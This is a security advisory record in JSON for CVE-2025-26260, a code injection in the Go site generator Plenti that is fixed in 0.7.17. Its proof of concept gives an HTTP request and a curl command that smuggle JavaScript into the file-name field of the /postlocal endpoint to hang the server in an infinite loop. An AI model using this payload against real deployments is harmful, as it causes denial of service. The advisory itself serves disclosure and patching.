{
  "id": "GHSA-mj4v-hp69-27x5",
  "modified": "2025-03-14T19:58:51Z",
  "published": "2025-02-05T21:30:53Z",
  "aliases": [
    "CVE-2025-26260",
    "GO-2025-3454",
    "GO-2025-3515"
  ],
  "related": [
    "CVE-2025-26260"
  ],
  "summary": "Plenti  - Code Injection - Denial of Services",
  "details": "### Summary\nWhile pushing a file via postLocal method if user add javascript code in file parameter that codes can exe in v8go context.\n\n### Details\nWhile posting a file via postLocal, any attacker will add javascript codes to file parameter. That parameter content pass to componentSignature method after some validation. After that componentSignature parameter concat with ssrStr parameter.\n\n\u003cimg width=\"1145\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a08a3fe5-2fbd-4a05-b93c-2ad127e6ee81\" /\u003e\n\nLast part of compileSvelte function ssrStr parameter executed in v8go engine.\n\n\u003cimg width=\"754\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4e622761-3324-48d6-8264-6dd6e09055af\" /\u003e\n\nThis cause to any one who can post a file also can push javascript code and run it. Thanks to v8go we can't use all javascript metod, if there is no any vulnerability in v8go we can't escape sandbox and can't run dangerous command like opening socket etc. But we can create infinite loop and the plenti can't response any request.\n\nAfter posting a file with name 'layouts/global/test; eval(`while(1);`);var test.svelte' we can see the ssrStr parameter include our javascript codes.\n\n\u003cimg width=\"1023\" alt=\"image\" src=\"https://github.com/user-attachments/assets/369c7820-ff8a-4b9a-9cd3-6b0692f1dcf3\" /\u003e\n\n**Note**: Eval usage not must I just want to ensure that it's run javascript commands.\n\n### PoC\n**Request**\n```\nPOST /postlocal HTTP/1.1\nHost: localhost:3000\nContent-Length: 125\nContent-Type: application/json; charset=utf-8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n[{\"action\":\"create\",\"encoding\":\"text\",\"file\":\"layouts/global/test; eval(`while(1);`);var test.svelte\",\"contents\":\"anethole\"}]\n```\n**Video**\n![PoC](https://github.com/user-attachments/assets/2aca36a1-6989-4be8-a8d1-3b12960f3e9b)\n\n**Curl Request**\n```\ncurl --path-as-is -i -s -k -X $'POST' \\\n    -H $'Host: localhost:3000' -H $'Content-Length: 125' -H $'Content-Type: application/json; charset=utf-8' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \\\n    --data-binary $'[{\\\"action\\\":\\\"create\\\",\\\"encoding\\\":\\\"text\\\",\\\"file\\\":\\\"layouts/global/test; eval(`while(1);`);var test.svelte\\\",\\\"contents\\\":\\\"anethole\\\"}]' \\\n    $'http://localhost:3000/postlocal'\n```\n\n### Impact\nIt's a remote code execution vulnerability. Because of the sandbox we can show only Denial of Service impact. Any vulnerability will be exists in v8go that cause to escape sandbox, different impacts can be show.\n\n**Note:** Plenti is using V8GO and V8GO is using V8 version of 11.1.278. This version released at 25 January 2023. After this date some RCE vulnerabilities founded in V8 like [CVE-2024-5830](https://github.com/advisories/GHSA-fchp-8m28-g68f),",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/plentico/plenti",
        "purl": "pkg:golang/github.com/plentico/plenti"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "0.7.17"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "\u003c= 0.7.16",
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-mj4v-hp69-27x5/GHSA-mj4v-hp69-27x5.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/plentico/plenti/security/advisories/GHSA-mj4v-hp69-27x5"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-26260"
    },
    {
      "type": "WEB",
      "url": "https://github.com/plentico/plenti/commit/c3e72a9ebbc2a03f4b0f3104becbfc25e390cb8e"
    },
    {
      "type": "WEB",
      "url": "https://ahmetakan.com/2025/02/14/cve-2025-26260"
    },
    {
      "type": "WEB",
      "url": "https://github.com/ahmetak4n/vulnerability-playground/tree/main/vulnerability-research/CVE-2025-26260"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/plentico/plenti"
    },
    {
      "type": "WEB",
      "url": "https://github.com/plentico/plenti/releases/tag/v0.7.17"
    },
    {
      "type": "WEB",
      "url": "https://pkg.go.dev/vuln/GO-2025-3454"
    },
    {
      "type": "WEB",
      "url": "https://pkg.go.dev/vuln/GO-2025-3515"
    }
  ]
}